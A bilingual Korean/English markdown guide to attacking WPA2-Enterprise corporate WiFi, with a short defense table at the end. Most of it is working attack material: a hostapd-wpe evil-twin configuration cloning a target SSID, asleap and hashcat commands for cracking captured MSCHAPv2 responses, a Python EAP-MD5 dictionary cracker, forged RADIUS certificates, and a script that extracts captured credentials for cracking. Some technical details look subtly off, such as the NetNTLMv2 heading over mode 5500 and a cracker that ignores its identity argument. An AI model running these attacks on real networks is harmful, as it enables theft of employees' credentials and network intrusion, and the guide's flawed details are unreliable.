> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 기업 WiFi 공격 (WPA2-Enterprise / RADIUS)

## 개요

WPA2-Enterprise는 개인 PSK 대신 RADIUS 서버를 통한 개별 사용자 인증을 사용한다. EAP(Extensible Authentication Protocol)를 기반으로 하며, EAP 타입에 따라 다양한 공격 벡터가 존재한다.

---

## EAP 프로토콜 구조

```
클라이언트(Supplicant) ←→ AP(Authenticator) ←→ RADIUS 서버
       EAP over LAN (EAPOL)        RADIUS 프로토콜
```

### 주요 EAP 타입

| EAP 타입 | 인증 방식 | 취약점 |
|----------|-----------|--------|
| EAP-MD5 | 챌린지-응답 (MD5) | 오프라인 크래킹 가능 |
| PEAP | TLS 터널 + MSCHAPv2 | 가짜 AP로 MSCHAPv2 획득 |
| EAP-TTLS | TLS 터널 + 다양한 내부 인증 | 인증서 검증 없으면 MITM |
| EAP-TLS | 상호 인증서 기반 | 클라이언트 인증서 필요 |
| EAP-FAST | PAC 기반 | PAC 탈취 공격 |

---

## 공격 1: 가짜 AP (Evil Twin) 구성

### hostapd-wpe 설치

```bash
# Kali Linux에서
apt-get install hostapd-wpe

# 또는 소스에서 빌드
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
cd hostapd-wpe
# 패치 적용 후 빌드
```

### hostapd-wpe 설정 파일 작성

```ini
# /etc/hostapd-wpe/hostapd-wpe.conf

# 네트워크 인터페이스 (모니터 모드 지원 필요)
interface=wlan0

# 드라이버
driver=nl80211

# SSID (대상 기업 WiFi 이름과 동일하게)
ssid=TargetCorpWiFi

# 채널 (대상 AP와 동일하게)
channel=6

# WPA2-Enterprise 설정
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1

# EAP 모듈 설정
eap_user_file=/etc/hostapd-wpe/hostapd.eap_user

# 인증서 설정 (자체 서명 CA)
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# WPA2 설정
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# 로그 파일
wpe_logfile=/tmp/wpe.log
```

### eap_user 파일 설정

```
# /etc/hostapd-wpe/hostapd.eap_user
# EAP 방법 허용 목록

"*"  PEAP,TTLS,TLS,FAST
"*"  MSCHAPV2,MD5,GTC,OTP,SIM,LEAP  [2]
```

### 가짜 AP 실행

```bash
# 무선 인터페이스를 모니터 모드로 전환
airmon-ng start wlan0

# 기존 AP와 같은 BSSID/채널로 실행
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 로그 모니터링
tail -f /tmp/wpe.log
```

---

## 공격 2: MSCHAPv2 크래킹

### wpe.log에서 MSCHAPv2 챌린지-응답 추출

```
# 전형적인 wpe.log 출력 형식
mschapv2: Fri Jan 01 12:00:00 2025
	 username:	johndoe
	 challenge:	2f:3a:8c:1d:5e:7b:9f:00
	 response:	4a:1b:8c:2d:3e:5f:6a:7b:8c:9d:0e:1f:2a:3b:4c:5d:6e:7f:8a:9b:0c:1d:2e:3f
```

### asleap으로 오프라인 크래킹

```bash
# asleap 설치
apt-get install asleap

# 사전 기반 크래킹
asleap -C CHALLENGE_HEX -R RESPONSE_HEX -W /usr/share/wordlists/rockyou.txt

# 예시
asleap \
  -C 2f:3a:8c:1d:5e:7b:9f:00 \
  -R 4a:1b:8c:2d:3e:5f:6a:7b:8c:9d:0e:1f:2a:3b:4c:5d:6e:7f:8a:9b:0c:1d:2e:3f \
  -W /usr/share/wordlists/rockyou.txt
```

### hashcat으로 NetNTLMv2 크래킹

```bash
# MSCHAPv2 해시 형식: username:::challenge:response:
echo "johndoe:::2f3a8c1d5e7b9f00:4a1b8c2d3e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f:" > hash.txt

# hashcat Mode 5500 (NetNTLMv1) 또는 Mode 5600 (NetNTLMv2)
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt

# GPU 사용 시
hashcat -m 5500 -d 1 hash.txt /usr/share/wordlists/rockyou.txt --force
```

---

## 공격 3: EAP-MD5 오프라인 크래킹

### 패킷 캡처

```bash
# 모니터 모드 활성화
airmon-ng start wlan0
airodump-ng wlan0mon --bssid TARGET_BSSID -c 6 -w eap_capture

# 특정 클라이언트 EAP 트래픽 필터링
tshark -r eap_capture.pcap -Y "eap" -T fields \
  -e eap.identity \
  -e eap.md5.value \
  -e eap.challenge
```

### Python EAP-MD5 크래커

```python
import hashlib
import struct

def crack_eap_md5(
    identity: str,
    challenge: bytes,
    response: bytes,
    wordlist_path: str,
) -> str | None:
    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            password = line.strip()
            # EAP-MD5: MD5(id || password || challenge)
            # id는 EAP 패킷의 Identifier 필드
            computed = hashlib.md5(
                b"\x01" + password.encode() + challenge
            ).digest()
            if computed == response:
                return password
    return None
```

---

## 공격 4: PEAP 인증서 검증 우회

인증서 검증을 안 하는 클라이언트(Windows 기본값 미설정)는 가짜 인증서를 수락한다.

### 자체 서명 인증서 생성

```bash
# CA 키 및 인증서 생성
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -key ca.key \
  -out ca.pem -subj "/CN=Evil Corp CA"

# 서버 키 및 CSR 생성
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr \
  -subj "/CN=radius.targetcorp.com"

# CA로 서버 인증서 서명
openssl x509 -req -days 365 \
  -in server.csr -CA ca.pem -CAkey ca.key \
  -CAcreateserial -out server.pem

# DH 파라미터 생성
openssl dhparam -out dh 2048
```

---

## Python 자동화: RADIUS 로그 파서

```python
#!/usr/bin/env python3
"""
WPE Log Parser - hostapd-wpe 로그에서 크리덴셜 추출
사용법: python3 wpe_parser.py --log /tmp/wpe.log --output creds.txt
"""

import argparse
import re
import sys
from dataclasses import dataclass
from pathlib import Path


@dataclass
class MSCHAPv2Credential:
    username: str
    challenge: str
    response: str

    def to_hashcat(self) -> str:
        challenge_clean = self.challenge.replace(":", "")
        response_clean = self.response.replace(":", "")
        return f"{self.username}:::{challenge_clean}:{response_clean}:"

    def to_asleap(self) -> str:
        return f"asleap -C {self.challenge} -R {self.response} -W rockyou.txt"


def parse_wpe_log(log_path: Path) -> list[MSCHAPv2Credential]:
    credentials: list[MSCHAPv2Credential] = []

    content = log_path.read_text(errors="ignore")

    # mschapv2 블록 파싱
    pattern = re.compile(
        r"mschapv2:.*?\n"
        r"\s+username:\s+(\S+)\n"
        r"\s+challenge:\s+([0-9a-f:]+)\n"
        r"\s+response:\s+([0-9a-f:]+)",
        re.DOTALL,
    )

    for match in pattern.finditer(content):
        username, challenge, response = match.groups()
        cred = MSCHAPv2Credential(
            username=username.strip(),
            challenge=challenge.strip(),
            response=response.strip(),
        )
        # 중복 제거
        if cred not in credentials:
            credentials.append(cred)

    # EAP-MD5 블록 파싱
    md5_pattern = re.compile(
        r"eap-md5:.*?\n"
        r"\s+username:\s+(\S+)\n"
        r"\s+challenge:\s+([0-9a-f:]+)\n"
        r"\s+response:\s+([0-9a-f:]+)",
        re.DOTALL,
    )
    # EAP-MD5는 별도 처리 (생략)

    return credentials


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WPE Log Parser - hostapd-wpe 크리덴셜 추출",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  python3 wpe_parser.py --log /tmp/wpe.log
  python3 wpe_parser.py --log /tmp/wpe.log --output creds.txt --format hashcat
        """,
    )
    parser.add_argument("--log", required=True, type=Path, help="wpe.log 파일 경로")
    parser.add_argument("--output", type=Path, help="출력 파일 (기본: 표준출력)")
    parser.add_argument(
        "--format",
        choices=["hashcat", "asleap", "both"],
        default="hashcat",
        help="출력 형식 (기본: hashcat)",
    )

    args = parser.parse_args()

    if not args.log.exists():
        print(f"[-] 파일을 찾을 수 없음: {args.log}", file=sys.stderr)
        sys.exit(1)

    credentials = parse_wpe_log(args.log)

    if not credentials:
        print("[-] 추출된 크리덴셜 없음", file=sys.stderr)
        sys.exit(1)

    print(f"[+] 추출된 MSCHAPv2 크리덴셜: {len(credentials)}개")

    output_lines: list[str] = []
    for cred in credentials:
        print(f"  [*] 사용자: {cred.username}")

        if args.format in ("hashcat", "both"):
            line = cred.to_hashcat()
            print(f"      Hashcat: {line}")
            output_lines.append(line)

        if args.format in ("asleap", "both"):
            line = cred.to_asleap()
            print(f"      asleap:  {line}")
            if args.format == "asleap":
                output_lines.append(line)

    if args.output:
        args.output.write_text("\n".join(output_lines) + "\n")
        print(f"\n[+] 크리덴셜 저장: {args.output}")
        print(f"    hashcat 실행: hashcat -m 5500 {args.output} wordlist.txt")


if __name__ == "__main__":
    main()
```

---

## 방어 대책

| 취약점 | 방어 방법 |
|--------|-----------|
| 가짜 AP | 클라이언트에서 서버 인증서 검증 필수화 |
| MSCHAPv2 크래킹 | EAP-TLS(인증서 기반)으로 전환 |
| EAP-MD5 | 사용 금지, PEAP/EAP-TLS로 교체 |
| 인증서 미검증 | CA 핀닝, 도메인 검증 설정 |
| 가짜 AP 탐지 | WIDS(무선 침입 탐지) 시스템 도입 |

### Windows 클라이언트 인증서 검증 강제 설정

```powershell
# GPO 또는 netsh로 인증서 검증 활성화
netsh wlan set profileparameter name="CorpWiFi" `
  authMode=machineOrUser

# 인증서 서버 검증 활성화 (레지스트리)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\RasMan\PPP\EAP\25" `
  -Name "ServerCertificate" -Value 1
```

---

<a name="english"></a>

# Enterprise WiFi Attacks (WPA2-Enterprise / RADIUS)

## Overview

WPA2-Enterprise uses per-user authentication via a RADIUS server instead of a shared PSK. It is based on EAP (Extensible Authentication Protocol), and various attack vectors exist depending on the EAP type in use.

---

## EAP Protocol Structure

```
Client (Supplicant) <-> AP (Authenticator) <-> RADIUS Server
       EAP over LAN (EAPOL)        RADIUS Protocol
```

### Key EAP Types

| EAP Type | Authentication Method | Vulnerability |
|----------|-----------------------|---------------|
| EAP-MD5 | Challenge-response (MD5) | Offline cracking possible |
| PEAP | TLS tunnel + MSCHAPv2 | Obtain MSCHAPv2 via rogue AP |
| EAP-TTLS | TLS tunnel + various inner auth | MITM if no cert validation |
| EAP-TLS | Mutual certificate-based | Client certificate required |
| EAP-FAST | PAC-based | PAC theft attack |

---

## Attack 1: Rogue AP (Evil Twin) Setup

### Installing hostapd-wpe

```bash
# On Kali Linux
apt-get install hostapd-wpe

# Or build from source
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
cd hostapd-wpe
# Apply patches then build
```

### Writing the hostapd-wpe Configuration File

```ini
# /etc/hostapd-wpe/hostapd-wpe.conf

# Network interface (must support monitor mode)
interface=wlan0

# Driver
driver=nl80211

# SSID (match the target corporate WiFi name)
ssid=TargetCorpWiFi

# Channel (match the target AP)
channel=6

# WPA2-Enterprise settings
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1

# EAP module settings
eap_user_file=/etc/hostapd-wpe/hostapd.eap_user

# Certificate settings (self-signed CA)
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# WPA2 settings
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# Log file
wpe_logfile=/tmp/wpe.log
```

### eap_user File Configuration

```
# /etc/hostapd-wpe/hostapd.eap_user
# Allowed EAP methods

"*"  PEAP,TTLS,TLS,FAST
"*"  MSCHAPV2,MD5,GTC,OTP,SIM,LEAP  [2]
```

### Starting the Rogue AP

```bash
# Switch wireless interface to monitor mode
airmon-ng start wlan0

# Run with the same BSSID/channel as the legitimate AP
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Monitor logs
tail -f /tmp/wpe.log
```

---

## Attack 2: MSCHAPv2 Cracking

### Extracting MSCHAPv2 Challenge-Response from wpe.log

```
# Typical wpe.log output format
mschapv2: Fri Jan 01 12:00:00 2025
	 username:	johndoe
	 challenge:	2f:3a:8c:1d:5e:7b:9f:00
	 response:	4a:1b:8c:2d:3e:5f:6a:7b:8c:9d:0e:1f:2a:3b:4c:5d:6e:7f:8a:9b:0c:1d:2e:3f
```

### Offline Cracking with asleap

```bash
# Install asleap
apt-get install asleap

# Dictionary-based cracking
asleap -C CHALLENGE_HEX -R RESPONSE_HEX -W /usr/share/wordlists/rockyou.txt

# Example
asleap \
  -C 2f:3a:8c:1d:5e:7b:9f:00 \
  -R 4a:1b:8c:2d:3e:5f:6a:7b:8c:9d:0e:1f:2a:3b:4c:5d:6e:7f:8a:9b:0c:1d:2e:3f \
  -W /usr/share/wordlists/rockyou.txt
```

### Cracking NetNTLMv2 with hashcat

```bash
# MSCHAPv2 hash format: username:::challenge:response:
echo "johndoe:::2f3a8c1d5e7b9f00:4a1b8c2d3e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f:" > hash.txt

# hashcat Mode 5500 (NetNTLMv1) or Mode 5600 (NetNTLMv2)
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt

# With GPU
hashcat -m 5500 -d 1 hash.txt /usr/share/wordlists/rockyou.txt --force
```

---

## Attack 3: EAP-MD5 Offline Cracking

### Packet Capture

```bash
# Enable monitor mode
airmon-ng start wlan0
airodump-ng wlan0mon --bssid TARGET_BSSID -c 6 -w eap_capture

# Filter EAP traffic for a specific client
tshark -r eap_capture.pcap -Y "eap" -T fields \
  -e eap.identity \
  -e eap.md5.value \
  -e eap.challenge
```

### Python EAP-MD5 Cracker

```python
import hashlib
import struct

def crack_eap_md5(
    identity: str,
    challenge: bytes,
    response: bytes,
    wordlist_path: str,
) -> str | None:
    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            password = line.strip()
            # EAP-MD5: MD5(id || password || challenge)
            # id is the Identifier field in the EAP packet
            computed = hashlib.md5(
                b"\x01" + password.encode() + challenge
            ).digest()
            if computed == response:
                return password
    return None
```

---

## Attack 4: Bypassing PEAP Certificate Validation

Clients that do not validate the server certificate (Windows default when unconfigured) will accept a rogue certificate.

### Generating a Self-Signed Certificate

```bash
# Generate CA key and certificate
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -key ca.key \
  -out ca.pem -subj "/CN=Evil Corp CA"

# Generate server key and CSR
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr \
  -subj "/CN=radius.targetcorp.com"

# Sign server certificate with CA
openssl x509 -req -days 365 \
  -in server.csr -CA ca.pem -CAkey ca.key \
  -CAcreateserial -out server.pem

# Generate DH parameters
openssl dhparam -out dh 2048
```

---

## Python Automation: RADIUS Log Parser

```python
#!/usr/bin/env python3
"""
WPE Log Parser - Extract credentials from hostapd-wpe logs
Usage: python3 wpe_parser.py --log /tmp/wpe.log --output creds.txt
"""

import argparse
import re
import sys
from dataclasses import dataclass
from pathlib import Path


@dataclass
class MSCHAPv2Credential:
    username: str
    challenge: str
    response: str

    def to_hashcat(self) -> str:
        challenge_clean = self.challenge.replace(":", "")
        response_clean = self.response.replace(":", "")
        return f"{self.username}:::{challenge_clean}:{response_clean}:"

    def to_asleap(self) -> str:
        return f"asleap -C {self.challenge} -R {self.response} -W rockyou.txt"


def parse_wpe_log(log_path: Path) -> list[MSCHAPv2Credential]:
    credentials: list[MSCHAPv2Credential] = []

    content = log_path.read_text(errors="ignore")

    # Parse mschapv2 blocks
    pattern = re.compile(
        r"mschapv2:.*?\n"
        r"\s+username:\s+(\S+)\n"
        r"\s+challenge:\s+([0-9a-f:]+)\n"
        r"\s+response:\s+([0-9a-f:]+)",
        re.DOTALL,
    )

    for match in pattern.finditer(content):
        username, challenge, response = match.groups()
        cred = MSCHAPv2Credential(
            username=username.strip(),
            challenge=challenge.strip(),
            response=response.strip(),
        )
        # Deduplicate
        if cred not in credentials:
            credentials.append(cred)

    return credentials


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WPE Log Parser - Extract hostapd-wpe credentials",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 wpe_parser.py --log /tmp/wpe.log
  python3 wpe_parser.py --log /tmp/wpe.log --output creds.txt --format hashcat
        """,
    )
    parser.add_argument("--log", required=True, type=Path, help="Path to wpe.log file")
    parser.add_argument("--output", type=Path, help="Output file (default: stdout)")
    parser.add_argument(
        "--format",
        choices=["hashcat", "asleap", "both"],
        default="hashcat",
        help="Output format (default: hashcat)",
    )

    args = parser.parse_args()

    if not args.log.exists():
        print(f"[-] File not found: {args.log}", file=sys.stderr)
        sys.exit(1)

    credentials = parse_wpe_log(args.log)

    if not credentials:
        print("[-] No credentials extracted", file=sys.stderr)
        sys.exit(1)

    print(f"[+] MSCHAPv2 credentials extracted: {len(credentials)}")

    output_lines: list[str] = []
    for cred in credentials:
        print(f"  [*] User: {cred.username}")

        if args.format in ("hashcat", "both"):
            line = cred.to_hashcat()
            print(f"      Hashcat: {line}")
            output_lines.append(line)

        if args.format in ("asleap", "both"):
            line = cred.to_asleap()
            print(f"      asleap:  {line}")
            if args.format == "asleap":
                output_lines.append(line)

    if args.output:
        args.output.write_text("\n".join(output_lines) + "\n")
        print(f"\n[+] Credentials saved: {args.output}")
        print(f"    Run hashcat: hashcat -m 5500 {args.output} wordlist.txt")


if __name__ == "__main__":
    main()
```

---

## Defenses

| Vulnerability | Defense |
|---------------|---------|
| Rogue AP | Enforce server certificate validation on clients |
| MSCHAPv2 cracking | Migrate to EAP-TLS (certificate-based) |
| EAP-MD5 | Disable; replace with PEAP/EAP-TLS |
| No certificate validation | CA pinning, domain validation configuration |
| Rogue AP detection | Deploy WIDS (Wireless Intrusion Detection System) |

### Forcing Certificate Validation on Windows Clients

```powershell
# Enable certificate validation via GPO or netsh
netsh wlan set profileparameter name="CorpWiFi" `
  authMode=machineOrUser

# Enable server certificate validation (registry)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\RasMan\PPP\EAP\25" `
  -Name "ServerCertificate" -Value 1
```
